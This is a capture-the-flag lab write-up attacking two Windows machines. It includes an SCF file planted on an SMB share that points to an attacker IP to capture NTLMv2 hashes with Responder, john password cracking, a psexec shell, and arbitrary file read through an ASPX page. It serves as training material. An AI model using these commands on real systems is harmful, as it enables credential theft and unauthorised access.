# Windows lab

## Machine 1

First thing we need to make a scan with ```nmap```:

    nmap -A -Pn <target_ip>

![enter image description here](https://i.ibb.co/hfW4hNj/Screen-Shot-2023-01-02-at-11-37-47-AM.png)
Nothing special.
Second thing, to enumerate shares with ```smbclient```

    smbclient -L <target_ip>

![enter image description here](https://i.ibb.co/7rMcjjV/Screen-Shot-2023-01-02-at-11-41-55-AM.png)
We got some shares here, but there is only three shares that we can access without credentials, compta, deepwin and orga.

If we access the compta share, we gonna find a zip file called ```file_backup.zip```:

![enter image description here](https://i.ibb.co/r7Phgmn/Screen-Shot-2023-01-02-at-12-40-31-PM.png)
To get the file, we run ``get file_backup.zip``, now we should find on our machine.
run ``unzip file_backup.zip`` to unzip the file, we enter the directory and we got an SCF file.

> SCF stands for Shell Command File and is a file format that supports a
> very limited set of Windows Explorer commands, such as opening a
> Windows Explorer window or showing the Desktop. The "Show Desktop"
> shortcut we all use on a daily basis is an SCF file.

Now cat the file:

![enter image description here](https://i.ibb.co/0rQHF9B/Screen-Shot-2023-01-02-at-12-53-30-PM.png)
We should make some changes on it first:

    [shell]
    command=2
    IconFile=\\<attacker_ip>\compta\hacked.ico
    [taskbar]
    Command=ToggleDesktop

It should look like this, now when the user browses the share, their system will establish a connection to our machine (server). The server will then send a challenge key to the client, which is used to encrypt the user's hashed password. This encrypted hash, known as the NTLMv2 hash, is sent back to the server as part of the authentication process. It is possible for a tool such as Responder to capture this NTLMv2 hash as it is transmitted over the network.

First we need to upload this file to the share as ``@file.scf``, adding @ will place the file.scf on the top of the share:

    curl --upload-file @file.scf -u 'Guest' smb://<target_ip>/compta

Now we can launch responder and wait till a user browse the file:

    responder -w --lm -v -I eth0

After waiting a short time, we got the Administrator hash:

![enter image description here](https://i.ibb.co/NtsXW7n/Screen-Shot-2023-01-02-at-1-08-17-PM.png)
We can't log using pass the hash because this an NTLMv2 hash, so we should try to crack the password:

    echo "<copy_the_Ntlmv2_hash_here>" > hash.txt && john -w=/usr/share/wordlists/rockyou.txt hash.txt

![enter image description here](https://i.ibb.co/mzFyvc3/Screen-Shot-2023-01-02-at-1-14-16-PM.png)
Now we got Administrator user password, we can use ``psexec.py`` to get a shell:

    psexec.py Administrator:P@ssw0rd@<target_ip> cmd.exe

Now we got a shell, go search for the flag.

## Machine 2

We should start with a quick nmap scan:

    nmap -Pn <target_ip>

![enter image description here](https://i.ibb.co/b3gkv8R/Screen-Shot-2023-01-02-at-8-30-50-PM.png)
We can see that we have an open http port, so we gonna try to access this website through our browser:

![enter image description here](https://i.ibb.co/qp0BBTq/Screen-Shot-2023-01-02-at-8-32-54-PM.png)
Nothing special, so we check if there is anything we can get from the requests made by the website.

Open inspect and go to the network Tab then refresh the page.

![enter image description here](https://i.ibb.co/cFhtvXP/Screen-Shot-2023-01-02-at-8-36-40-PM.png)
We can see that we are dealing with an ASP.NET Backend Framework, now we should try if there is any pages we can access, to do this we gonna use a simple ```dirb```, to search for any ``.aspx`` files:

    dirb http://<target_ip>/ -X .aspx
![enter image description here](https://i.ibb.co/2Wnx4hp/Screen-Shot-2023-01-02-at-8-41-13-PM.png)
We found three files, let's check them out.

![enter image description here](https://i.ibb.co/Rzc9jw3/Screen-Shot-2023-01-02-at-8-43-16-PM.png)
It says that we can read files from here, let's give the path of the flag and it suppose to give us it's content.
 enter: ``C:/Users/Administrator/Desktop/proof.txt`` and congratulation.
